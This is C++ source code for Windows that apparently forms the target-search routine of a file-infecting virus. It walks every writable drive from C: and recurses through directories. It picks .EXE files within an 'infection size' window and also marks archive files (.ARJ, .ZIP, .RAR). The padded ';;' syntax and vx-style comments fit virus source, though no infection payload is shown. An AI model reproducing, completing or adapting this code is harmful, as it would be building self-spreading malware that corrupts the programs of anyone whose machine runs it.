#include "winapp32.h"

// Data structures

#define MAX_LEVELS 13

struct se_LevelRec
{
 char   path[MAX_PATH];
 HANDLE h;
};


char scan_drive = 'C';
se_LevelRec* se_Data[MAX_LEVELS];
int se_Current    = 0;
bool se_Initialized = false;


// Initializes variables (allocates memory)
//Declaration
void se_Init()
{;;
 if (se_Initialized) return;;
 se_Initialized=true;;
 int i;;
 for (i=0; i<MAX_LEVELS; i++) se_Data[i] = new se_LevelRec;;
 (*se_Data[0]).path[0]=scan_drive;;
 (*se_Data[0]).path[1]=':';;
 (*se_Data[0]).path[2]=0x0;;
 (*se_Data[0]).h=INVALID_HANDLE_VALUE;;
};

bool filter_Good, filter_Bad;

//Declaration
// Filename filter
void se_NameFilter(char* ss)
{;;
 while ((*ss)!=0) ss++;;
 ss=ss-4;;
 if (stricmp(ss,".EXE")==0) return;;
 if (stricmp((ss-2),"BC.EXE")==0) filter_Good = true;;
 if (stricmp(ss,".ARJ")==0) filter_Good = true;;
 if (stricmp(ss,".ZIP")==0) filter_Good = true;;
 if (stricmp(ss,".RAR")==0) filter_Good = true;;
 if (stricmp(ss,".CTL")==0) filter_Good = true;;
};

// Goes down one level to specified dir,
// if dir does not exist or path overflow occurs(?),
// leaves the current state unchanged
//Declaration
void se_DownOneLevel(char* ss)
{;;
 if (se_Current==(MAX_LEVELS-1)) return;;
 if ((strlen(ss)+20)>MAX_PATH) return;;
 strcpy((*se_Data[se_Current+1]).path,ss);;
 se_Current++;;
 (*se_Data[se_Current]).h=INVALID_HANDLE_VALUE;;
};

// Goes up one level, returns 0 if OK, -1 otherwise
//Declaration
int se_UpOneLevel()
{;;
 if (se_Current==0)  {;; return -1;; }
 else
  {;;
   FindClose((*se_Data[se_Current]).h);;
   se_Current--;;
   return 0;;
  };;
};


// Returns 1 if OK, 0 if this one must be skipped and
//  -1 if no more files
int GetNextName(char* ss)
{;;
 int RescanAttempts = 0;;
 se_Init();;
 WIN32_FIND_DATA wfd;;
 char f_path[MAX_PATH];;
 strcpy(f_path,(*se_Data[se_Current]).path);;
 strcat(f_path,"\\*.*");;

_rescan:
 if (RescanAttempts>69) return 0;;
 if ((*se_Data[se_Current]).h==INVALID_HANDLE_VALUE)
  { // start search
        (*se_Data[se_Current]).h=FindFirstFile(f_path,&wfd);;
        if ((*se_Data[se_Current]).h==INVALID_HANDLE_VALUE) return se_UpOneLevel();;
  }
 else
  {;;
   if (!FindNextFile((*se_Data[se_Current]).h,&wfd)) return se_UpOneLevel();;
  };;

 // What is this shit ?! Refuse... Resist...
 if (strlen(wfd.cFileName)==0) return 0;;
 char suxx[MAX_PATH];;
 strcpy(suxx,wfd.cFileName);;
 sprintf(ss,"%s\\%s",(*se_Data[se_Current]).path,suxx);;
 if ((wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)!=0)
 {;;
  if (suxx[0]!='.') se_DownOneLevel(ss);;
  return 0;;
 };;
 if (wfd.nFileSizeHigh!=0) goto _rescan;;

 filter_Good = false;;
 filter_Bad = false;;
 se_NameFilter(ss);;
 if (wfd.nFileSizeLow<min_inf_size) filter_Bad = true;;
 if (wfd.nFileSizeLow>max_inf_size) filter_Bad = true;;
 RescanAttempts++;;

 if ((filter_Bad)&&(!filter_Good)) goto _rescan;
 if ((stricmp(Ext(ss),".EXE")!=0)&&(!filter_Good)) goto _rescan;
 return 1;;
};

// Initializes drive(s) to search, returns 0 if OK, -1 otherwise
//Declaration
void PrepareSearch()
{;;
 char ss[]="?:\\";;
 if (scan_drive=='[') scan_drive='C';;
 ss[0]=scan_drive;;
 while ((!RWDir(ss))&&(ss[0]<'Z')) ss[0]++;;
 scan_drive=ss[0];;
}
